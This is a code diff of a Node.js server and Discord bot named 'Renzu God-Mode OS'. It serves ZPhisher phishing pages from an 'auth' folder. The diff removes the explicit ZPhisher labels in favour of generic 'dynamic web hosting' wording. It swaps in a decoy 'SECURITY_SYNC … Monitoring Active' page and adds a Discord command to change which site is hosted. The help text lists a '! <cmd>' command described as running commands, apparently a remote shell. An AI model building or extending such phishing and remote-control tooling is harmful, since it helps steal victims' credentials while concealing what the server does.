@@ -6,20 +6,29 @@ const fs = require('fs');
 require('dotenv').config();
 
 const app = express();
-// --- ZPHISHER INTEGRATION & MASKING ---
-const ZPHISHER_DIR = path.join(process.cwd(), 'auth'); // ZPhisher usually saves pages in 'auth' or 'site'
-app.use(express.static(ZPHISHER_DIR));
+// --- DYNAMIC WEB HOSTING ---
+app.use((req, res, next) => {
+    const webPath = path.join(process.cwd(), state.currentWebDir);
+    if (fs.existsSync(webPath)) {
+        express.static(webPath)(req, res, next);
+    } else {
+        next();
+    }
+});
 
 app.get('/', (req, res) => {
-    const indexPath = path.join(ZPHISHER_DIR, 'index.html');
+    const webPath = path.join(process.cwd(), state.currentWebDir);
+    const indexPath = path.join(webPath, 'index.html');
+
     if (fs.existsSync(indexPath)) {
         return res.sendFile(indexPath);
     }
+
     res.send(`
         <html>
-            <head><title>System Maintenance</title><style>body{background:#000;color:#333;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}</style></head>
+            <head><title>System Update</title><style>body{background:#000;color:#222;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}</style></head>
             <body>
-                <pre>SERVICE_UNAVAILABLE: Renzu God-Mode OS is currently syncing with ZPhisher terminal... [T${state.activeId}]</pre>
+                <pre>SECURITY_SYNC: Renzu God-Mode Monitoring Active [T${state.activeId}]</pre>
             </body>
         </html>
     `);
@@ -38,6 +47,7 @@ const STATE_FILE = './state.json';
 let state = {
     currentDir: process.cwd(),
     activeId: 1,
+    currentWebDir: 'auth', // Default folder to host
     buffers: { 1: "", 2: "", 3: "", 4: "" }
 };
 
@@ -96,8 +106,23 @@ client.on('messageCreate', async (message) => {
     }
 
     // Help & Status
-    if (msg === '?help') return message.reply({ content: "🖥️ **Renzu OS Commands:** `! <cmd>`, `?status`, `?help`", components: getTerminalButtons() });
-    if (msg === '?status') return message.reply(`📊 **T${state.activeId}** | 📂 \`${process.cwd()}\` | Shell: \`${process.env.SHELL || 'bash'}\``);
+    if (msg === '?help') return message.reply({
+        content: "🖥️ **Renzu OS Commands:**\n`! <cmd>` - Run command\n`!web <folder>` - Change website folder (e.g., !web auth)\n`?status` - See bot info\n`?help` - This menu",
+        components: getTerminalButtons()
+    });
+    if (msg === '?status') return message.reply(`📊 **T${state.activeId}** | 📂 \`${process.cwd()}\` | 🌍 Web Root: \`${state.currentWebDir}\``);
+
+    if (msg.startsWith('!web ')) {
+        const folder = msg.slice(5).trim();
+        const fullPath = path.join(process.cwd(), folder);
+        if (fs.existsSync(fullPath)) {
+            state.currentWebDir = folder;
+            saveState();
+            return message.reply(`✅ **Web Root Changed:** Website is now hosting files from \`/${folder}\``);
+        } else {
+            return message.reply(`❌ **Error:** Folder \`${folder}\` not found in project directory!`);
+        }
+    }
 
     if (msg.startsWith('!')) {
         let cmd = msg.startsWith('! ') ? msg.slice(2) : msg.slice(1);
